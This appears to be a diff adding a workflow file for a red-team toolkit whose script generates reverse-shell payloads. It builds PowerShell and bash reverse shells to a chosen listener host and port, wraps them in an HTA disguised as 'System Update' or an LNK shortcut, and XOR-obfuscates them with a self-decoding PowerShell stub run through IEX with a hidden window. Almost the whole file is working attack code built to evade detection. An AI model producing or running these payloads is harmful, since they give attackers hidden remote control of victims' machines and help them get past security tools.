@@ -1,0 +1,116 @@
+name: payload-gen
+description: |
+  Payload generator — create HTA, LNK, PowerShell, or reverse shell
+  payloads with optional XOR obfuscation.
+tags: [redteam, payload, evasion, exploit]
+dispatch:
+  inputs:
+    lhost:
+      required: true
+      type: string
+      description: Listener IP address
+    lport:
+      required: true
+      type: string
+      description: Listener port
+    payload_type:
+      required: true
+      type: string
+      description: "Payload type: hta, lnk, ps1, or revshell"
+    obfuscate:
+      type: string
+      default: "false"
+      description: Apply XOR packing to payload
+
+jobs:
+  generate:
+    name: Generate Payload
+    outputs:
+      payload_file: "{{ steps.build-payload.outputs.payload_file }}"
+      payload_type: "{{ steps.build-payload.outputs.payload_type }}"
+      payload_size: "{{ steps.build-payload.outputs.payload_size }}"
+    steps:
+    - name: build-payload
+      timeout: 3
+      continue-on-error: true
+      script: |
+        from ofx.api.payloads import build_hta, build_lnk, inline_base64_ps, save
+        from ofx.api.packers import xor_pack
+        from ofx.api.c2 import powershell_reverse_shell, bash_reverse_shell
+        from pathlib import Path
+        import base64
+
+        lhost = "{{ inputs.lhost }}"
+        lport = int("{{ inputs.lport }}")
+        ptype = "{{ inputs.payload_type }}"
+        obfuscate = "{{ inputs.obfuscate }}" == "true"
+
+        output_dir = Path("/tmp/ofx_payloads")
+        output_dir.mkdir(parents=True, exist_ok=True)
+
+        content = ""
+        filename = ""
+
+        if ptype == "hta":
+            # Build PS reverse shell, then wrap in HTA
+            ps_cmd = powershell_reverse_shell(lhost, lport)
+            ps_b64 = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
+            payload_url_cmd = f"powershell -nop -w hidden -enc {ps_b64}"
+            content = build_hta(payload_url_cmd, title="System Update")
+            filename = "update.hta"
+
+        elif ptype == "lnk":
+            ps_cmd = powershell_reverse_shell(lhost, lport)
+            ps_encoded = inline_base64_ps(ps_cmd)
+            content = build_lnk(ps_encoded, icon="shell32.dll,21")
+            filename = "create_shortcut.ps1"
+
+        elif ptype == "ps1":
+            ps_cmd = powershell_reverse_shell(lhost, lport)
+            if obfuscate:
+                # XOR-pack the raw PS payload
+                packed = xor_pack(ps_cmd.encode(), "ofx")
+                packed_b64 = base64.b64encode(packed).decode()
+                # Build self-extracting PS decoder
+                content = (
+                    f"$k=[System.Text.Encoding]::UTF8.GetBytes('ofx');"
+                    f"$d=[Convert]::FromBase64String('{packed_b64}');"
+                    f"$r=New-Object byte[] $d.Length;"
+                    f"for($i=0;$i -lt $d.Length;$i++){{$r[$i]=$d[$i] -bxor $k[$i%$k.Length]}};"
+                    f"IEX([System.Text.Encoding]::UTF8.GetString($r))"
+                )
+                obfuscate = False  # Already applied
+            else:
+                content = ps_cmd
+            filename = "payload.ps1"
+
+        elif ptype == "revshell":
+            content = bash_reverse_shell(lhost, lport)
+            filename = "revshell.sh"
+
+        else:
+            print(f"[-] Unknown payload type: {ptype}")
+            print("    Supported: hta, lnk, ps1, revshell")
+            raise SystemExit(1)
+
+        if obfuscate and content:
+            packed = xor_pack(content.encode(), "ofx")
+            packed_b64 = base64.b64encode(packed).decode()
+            content = f"# XOR-packed (key=ofx, base64)\n{packed_b64}"
+            filename = f"{filename}.packed"
+
+        out_path = output_dir / filename
+        save(content, str(out_path))
+
+        print(f"[+] Payload generated: {ptype}")
+        print(f"    File: {out_path}")
+        print(f"    Size: {len(content)} bytes")
+        print(f"    Obfuscated: {obfuscate}")
+        print(f"\n--- Preview (first 200 chars) ---")
+        print(content[:200])
+
+        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
+            f.write(f"payload_file={out_path}\n")
+            f.write(f"payload_type={ptype}\n")
+            f.write(f"payload_size={len(content)}\n")
+      log-stdout: true
